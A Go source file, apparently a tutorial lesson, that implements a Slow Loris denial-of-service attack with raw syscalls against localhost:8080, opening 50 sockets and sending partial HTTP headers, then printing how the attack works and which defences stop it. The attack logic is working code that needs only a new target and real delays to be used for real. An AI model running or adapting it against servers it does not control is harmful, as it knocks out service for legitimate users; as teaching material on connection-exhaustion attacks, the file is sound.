/*
 * 04_slow_loris.go
 *
 * Educational Slow Loris DoS attack demonstration using syscalls
 *
 * EDUCATIONAL PURPOSE ONLY - Use only against your own servers!
 *
 * What is Slow Loris?
 * - Opens many connections to a web server
 * - Sends partial HTTP requests very slowly
 * - Keeps connections alive by sending incomplete headers
 * - Exhausts server's connection pool
 * - Causes denial of service for legitimate users
 *
 * This demonstrates:
 * - How connection exhaustion attacks work
 * - Why servers need connection limits and timeouts
 * - Resource management in network programming
 *
 * Syscalls used:
 * - SYS_SOCKET (create sockets)
 * - SYS_CONNECT (connect to target)
 * - SYS_WRITE (send partial requests)
 * - SYS_CLOSE (cleanup)
 *
 * WARNING: Only use against servers you own or have permission to test!
 */

package main

import (
	"syscall"
	"unsafe"
)

func main() {
	// Configuration
	targetIP := [4]byte{127, 0, 0, 1} // 127.0.0.1 (localhost only!)
	targetPort := uint16(8080)        // Target port
	numConnections := 50              // Number of connections (kept low for education)

	// Safety check message
	safetyMsg := "=== SLOW LORIS EDUCATIONAL DEMONSTRATION ===\n"
	safetyMsg += "WARNING: This is for educational purposes only!\n"
	safetyMsg += "Only targeting localhost:8080 (your own server)\n"
	safetyMsg += "Starting attack with " + intToString(numConnections) + " connections...\n\n"

	safetyBytes := []byte(safetyMsg)
	safetyPtr := uintptr(unsafe.Pointer(&safetyBytes[0]))
	syscall.Syscall(syscall.SYS_WRITE, 1, safetyPtr, uintptr(len(safetyMsg)))

	// Array to store all our socket file descriptors
	sockets := make([]uintptr, numConnections)
	successfulConnections := 0

	// Step 1: Create many connections
	for i := 0; i < numConnections; i++ {
		// Create socket
		socketFD, _, err := syscall.Syscall(
			syscall.SYS_SOCKET,
			syscall.AF_INET,     // IPv4
			syscall.SOCK_STREAM, // TCP
			0,                   // Default protocol
		)

		if err != 0 {
			// Skip this connection if socket creation failed
			continue
		}

		// Set up target address
		serverAddr := make([]byte, 16)

		// sin_family = AF_INET
		serverAddr[0] = byte(syscall.AF_INET & 0xFF)
		serverAddr[1] = byte((syscall.AF_INET >> 8) & 0xFF)

		// sin_port in network byte order
		serverAddr[2] = byte((targetPort >> 8) & 0xFF)
		serverAddr[3] = byte(targetPort & 0xFF)

		// sin_addr = target IP
		serverAddr[4] = targetIP[0]
		serverAddr[5] = targetIP[1]
		serverAddr[6] = targetIP[2]
		serverAddr[7] = targetIP[3]

		// Connect to target
		serverAddrPtr := uintptr(unsafe.Pointer(&serverAddr[0]))
		_, _, err = syscall.Syscall(
			syscall.SYS_CONNECT,
			socketFD,
			serverAddrPtr,
			uintptr(len(serverAddr)),
		)

		if err != 0 {
			// Connection failed, close socket and skip
			syscall.Syscall(syscall.SYS_CLOSE, socketFD, 0, 0)
			continue
		}

		// Store successful connection
		sockets[successfulConnections] = socketFD
		successfulConnections++

		// Show progress
		if i%10 == 0 {
			progressMsg := "Created connection " + intToString(i+1) + "/" + intToString(numConnections) + "\n"
			progressBytes := []byte(progressMsg)
			progressPtr := uintptr(unsafe.Pointer(&progressBytes[0]))
			syscall.Syscall(syscall.SYS_WRITE, 1, progressPtr, uintptr(len(progressMsg)))
		}
	}

	connectedMsg := "Successfully connected: " + intToString(successfulConnections) + " sockets\n\n"
	connectedBytes := []byte(connectedMsg)
	connectedPtr := uintptr(unsafe.Pointer(&connectedBytes[0]))
	syscall.Syscall(syscall.SYS_WRITE, 1, connectedPtr, uintptr(len(connectedMsg)))

	if successfulConnections == 0 {
		errorMsg := "Error: Could not establish any connections\n"
		errorMsg += "Make sure the HTTP server is running on localhost:8080\n"
		errorBytes := []byte(errorMsg)
		errorPtr := uintptr(unsafe.Pointer(&errorBytes[0]))
		syscall.Syscall(syscall.SYS_WRITE, 2, errorPtr, uintptr(len(errorMsg)))
		syscall.Syscall(syscall.SYS_EXIT, 1, 0, 0)
	}

	// Step 2: Send partial HTTP requests to keep connections alive
	attackMsg := "Sending partial HTTP requests to exhaust server resources...\n"
	attackBytes := []byte(attackMsg)
	attackPtr := uintptr(unsafe.Pointer(&attackBytes[0]))
	syscall.Syscall(syscall.SYS_WRITE, 1, attackPtr, uintptr(len(attackMsg)))

	// Send initial partial request to all connections
	initialRequest := "GET / HTTP/1.1\r\n"
	initialBytes := []byte(initialRequest)
	initialPtr := uintptr(unsafe.Pointer(&initialBytes[0]))

	for i := 0; i < successfulConnections; i++ {
		syscall.Syscall(
			syscall.SYS_WRITE,
			sockets[i],
			initialPtr,
			uintptr(len(initialRequest)),
		)
	}

	sentInitialMsg := "Sent initial partial requests\n"
	sentInitialBytes := []byte(sentInitialMsg)
	sentInitialMsgPtr := uintptr(unsafe.Pointer(&sentInitialBytes[0]))
	syscall.Syscall(syscall.SYS_WRITE, 1, sentInitialMsgPtr, uintptr(len(sentInitialMsg)))

	// Step 3: Keep connections alive by sending more partial headers slowly
	// In a real attack, this would continue indefinitely with delays
	// For education, we'll just send a few more partial headers

	partialHeaders := []string{
		"Host: localhost:8080\r\n",
		"User-Agent: SlowLoris-Educational\r\n",
		"Accept: text/html\r\n",
		"Accept-Language: en-US\r\n",
		"Accept-Encoding: gzip\r\n",
		"Connection: keep-alive\r\n",
	}

	for headerIndex, header := range partialHeaders {
		headerMsg := "Sending header " + intToString(headerIndex+1) + ": " + header[:len(header)-2] + "\n"
		headerMsgBytes := []byte(headerMsg)
		headerMsgPtr := uintptr(unsafe.Pointer(&headerMsgBytes[0]))
		syscall.Syscall(syscall.SYS_WRITE, 1, headerMsgPtr, uintptr(len(headerMsg)))

		headerBytes := []byte(header)
		headerPtr := uintptr(unsafe.Pointer(&headerBytes[0]))

		// Send this header to all active connections
		activeConnections := 0
		for i := 0; i < successfulConnections; i++ {
			_, _, err := syscall.Syscall(
				syscall.SYS_WRITE,
				sockets[i],
				headerPtr,
				uintptr(len(header)),
			)

			if err == 0 {
				activeConnections++
			}
		}

		statusMsg := "Header sent to " + intToString(activeConnections) + " active connections\n"
		statusBytes := []byte(statusMsg)
		statusPtr := uintptr(unsafe.Pointer(&statusBytes[0]))
		syscall.Syscall(syscall.SYS_WRITE, 1, statusPtr, uintptr(len(statusMsg)))

		// In a real attack, there would be a delay here to send headers slowly
		// We'll simulate a brief pause by doing some busy work
		for j := 0; j < 1000000; j++ {
			// Simple busy wait (not accurate timing, but demonstrates the concept)
		}
	}

	// Step 4: Show attack impact
	impactMsg := "\n=== ATTACK IMPACT ANALYSIS ===\n"
	impactMsg += "This attack demonstrates how:\n"
	impactMsg += "1. Multiple incomplete connections consume server resources\n"
	impactMsg += "2. Server connection pool gets exhausted\n"
	impactMsg += "3. Legitimate users cannot connect to the server\n"
	impactMsg += "4. Server becomes unresponsive due to resource exhaustion\n\n"

	impactBytes := []byte(impactMsg)
	impactPtr := uintptr(unsafe.Pointer(&impactBytes[0]))
	syscall.Syscall(syscall.SYS_WRITE, 1, impactPtr, uintptr(len(impactMsg)))

	// Step 5: Demonstrate that connections are still active
	testMsg := "Testing if connections are still active...\n"
	testBytes := []byte(testMsg)
	testPtr := uintptr(unsafe.Pointer(&testBytes[0]))
	syscall.Syscall(syscall.SYS_WRITE, 1, testPtr, uintptr(len(testMsg)))

	activeCount := 0
	testHeader := "X-Test-Header: checking\r\n"
	testHeaderBytes := []byte(testHeader)
	testHeaderPtr := uintptr(unsafe.Pointer(&testHeaderBytes[0]))

	for i := 0; i < successfulConnections; i++ {
		_, _, err := syscall.Syscall(
			syscall.SYS_WRITE,
			sockets[i],
			testHeaderPtr,
			uintptr(len(testHeader)),
		)

		if err == 0 {
			activeCount++
		}
	}

	resultMsg := intToString(activeCount) + " connections still active after attack\n"
	resultBytes := []byte(resultMsg)
	resultPtr := uintptr(unsafe.Pointer(&resultBytes[0]))
	syscall.Syscall(syscall.SYS_WRITE, 1, resultPtr, uintptr(len(resultMsg)))

	// Step 6: Clean up connections
	cleanupMsg := "\nCleaning up connections...\n"
	cleanupBytes := []byte(cleanupMsg)
	cleanupPtr := uintptr(unsafe.Pointer(&cleanupBytes[0]))
	syscall.Syscall(syscall.SYS_WRITE, 1, cleanupPtr, uintptr(len(cleanupMsg)))

	for i := 0; i < successfulConnections; i++ {
		syscall.Syscall(syscall.SYS_CLOSE, sockets[i], 0, 0)
	}

	// Educational summary
	summaryMsg := "\n=== EDUCATIONAL SUMMARY ===\n"
	summaryMsg += "Slow Loris attack completed. Key learning points:\n\n"
	summaryMsg += "HOW IT WORKS:\n"
	summaryMsg += "• Opens many TCP connections to target server\n"
	summaryMsg += "• Sends HTTP requests very slowly (incomplete headers)\n"
	summaryMsg += "• Server keeps connections open waiting for complete request\n"
	summaryMsg += "• Server's connection pool gets exhausted\n"
	summaryMsg += "• Legitimate users cannot connect\n\n"
	summaryMsg += "WHY IT'S EFFECTIVE:\n"
	summaryMsg += "• Uses minimal bandwidth (hard to detect)\n"
	summaryMsg += "• Exploits server's patience with slow clients\n"
	summaryMsg += "• Each connection uses server memory/resources\n"
	summaryMsg += "• Can take down servers with just a few connections\n\n"
	summaryMsg += "DEFENSES:\n"
	summaryMsg += "• Connection timeouts (close slow connections)\n"
	summaryMsg += "• Connection limits per IP address\n"
	summaryMsg += "• Request header timeouts\n"
	summaryMsg += "• Load balancers with DDoS protection\n"
	summaryMsg += "• Rate limiting and traffic analysis\n\n"
	summaryMsg += "IMPORTANT: This is for educational purposes only!\n"
	summaryMsg += "Only use against servers you own or have permission to test.\n"

	summaryBytes := []byte(summaryMsg)
	summaryPtr := uintptr(unsafe.Pointer(&summaryBytes[0]))
	syscall.Syscall(syscall.SYS_WRITE, 1, summaryPtr, uintptr(len(summaryMsg)))

	// Exit successfully
	syscall.Syscall(syscall.SYS_EXIT, 0, 0, 0)
}

// Helper function to convert integer to string (manual implementation for syscalls-only approach)
func intToString(n int) string {
	if n == 0 {
		return "0"
	}

	digits := make([]byte, 0, 10)
	for n > 0 {
		digits = append([]byte{byte('0' + n%10)}, digits...)
		n /= 10
	}
	return string(digits)
}
